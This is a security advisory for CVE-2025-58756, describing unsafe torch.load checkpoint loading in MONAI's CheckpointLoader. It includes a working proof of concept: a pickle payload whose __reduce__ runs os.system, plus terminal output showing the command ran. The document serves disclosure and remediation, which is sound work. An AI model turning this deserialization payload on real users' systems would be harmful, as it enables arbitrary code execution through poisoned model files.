# MONAI: Unsafe torch usage may lead to arbitrary code execution

**GHSA**: GHSA-6vm5-6jv9-rjpj | **CVE**: CVE-2025-58756 | **Severity**: high (CVSS 8.8)

**CWE**: CWE-502

**Affected Packages**:
- **monai** (pip): <= 1.5.0

## Description

### Summary
In ```model_dict = torch.load(full_path, map_location=torch.device(device), weights_only=True)``` in monai/bundle/scripts.py , ```weights_only=True``` is loaded securely. However, insecure loading methods still exist elsewhere in the project, such as when loading checkpoints.

This is a common practice when users want to reduce training time and costs by loading pre-trained models downloaded from platforms like huggingface.

Loading a checkpoint containing malicious content can trigger a deserialization vulnerability, leading to code execution.

The following proof-of-concept demonstrates the issues that arise when loading insecure checkpoints.

```

import os  
import tempfile  
import json  
import torch  
from pathlib import Path  
  
class MaliciousPayload:  
    def __reduce__(self):  
        return (os.system, ('touch /tmp/hacker2.txt',))  
  
def test_checkpoint_loader_attack():  

      

    temp_dir = Path(tempfile.mkdtemp())  
    checkpoint_file = temp_dir / "malicious_checkpoint.pt"  
      

    malicious_checkpoint = {  
        'model_state_dict': MaliciousPayload(),  
        'optimizer_state_dict': {},  
        'epoch': 100  
    }  
      

    torch.save(malicious_checkpoint, checkpoint_file)  
      
     
    from monai.handlers import CheckpointLoader  
    import torch.nn as nn  
          
 
    model = nn.Linear(10, 1)  
        
    loader = CheckpointLoader(  
        load_path=str(checkpoint_file),  
        load_dict={"model": model}  
    )  
          
    class MockEngine:  
        def __init__(self):  
            self.state = type('State', (), {})()  
            self.state.max_epochs = None  
            self.state.epoch = 0  
          
    engine = MockEngine()  
    loader(engine)  
          
          
    proof_file = "/tmp/hacker2.txt"  
    if os.path.exists(proof_file):  
        print("Succes")  
        #os.remove(proof_file)  
        return True  
    else:  
        print("False")  
        return False  
  
if __name__ == "__main__":   
    success = test_checkpoint_loader_attack()  

```
Because my test environment is missing some content, an error will be reported during operation, but the operation is still executed.
```
root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# ls /tmp
autodl.sh.log  checkpoint_pwned.txt  hacker1.txt  selenium-managersXRcjF  supervisor.sock  supervisord.pid  tmpgjp8145d  tmpi3_u3wn8  tmpjvuhwif6  tmpkocoo34q  tmpp3q8occa
root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# python p2.py 
Traceback (most recent call last):
  File "/root/autodl-tmp/mmm/p2.py", line 61, in <module>
    success = test_checkpoint_loader_attack()  
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/autodl-tmp/mmm/p2.py", line 48, in test_checkpoint_loader_attack
    loader(engine)  
    ^^^^^^^^^^^^^^
  File "/root/miniconda3/lib/python3.12/site-packages/monai/handlers/checkpoint_loader.py", line 146, in __call__
    Checkpoint.load_objects(to_load=self.load_dict, checkpoint=checkpoint, strict=self.strict)
  File "/root/miniconda3/lib/python3.12/site-packages/ignite/handlers/checkpoint.py", line 624, in load_objects
    _tree_apply2(_load_object, to_load, checkpoint_obj)
  File "/root/miniconda3/lib/python3.12/site-packages/ignite/utils.py", line 209, in _tree_apply2
    _tree_apply2(func, _CollectionItem.wrap(x, k, v), y[k])
  File "/root/miniconda3/lib/python3.12/site-packages/ignite/utils.py", line 216, in _tree_apply2
    return func(x, y)
           ^^^^^^^^^^
  File "/root/miniconda3/lib/python3.12/site-packages/ignite/handlers/checkpoint.py", line 613, in _load_object
    obj.load_state_dict(chkpt_obj, **kwargs)
  File "/root/miniconda3/lib/python3.12/site-packages/torch/nn/modules/module.py", line 2581, in load_state_dict
    raise RuntimeError(
RuntimeError: Error(s) in loading state_dict for Linear:
        Missing key(s) in state_dict: "weight", "bias". 
        Unexpected key(s) in state_dict: "model_state_dict", "optimizer_state_dict", "epoch". 
root@autodl-container-a53c499c18-c5ca272d:~/autodl-tmp/mmm# ls /tmp
autodl.sh.log  checkpoint_pwned.txt  hacker1.txt  hacker2.txt  selenium-managersXRcjF  supervisor.sock  supervisord.pid  tmpgjp8145d  tmpi02txakb  tmpi3_u3wn8  tmpjvuhwif6  tmpkocoo34q  tmpp3q8occa
```


### Impact
Leading to arbitrary command execution
### Fix suggestion
Use a safe method to load, or force weights_only=True
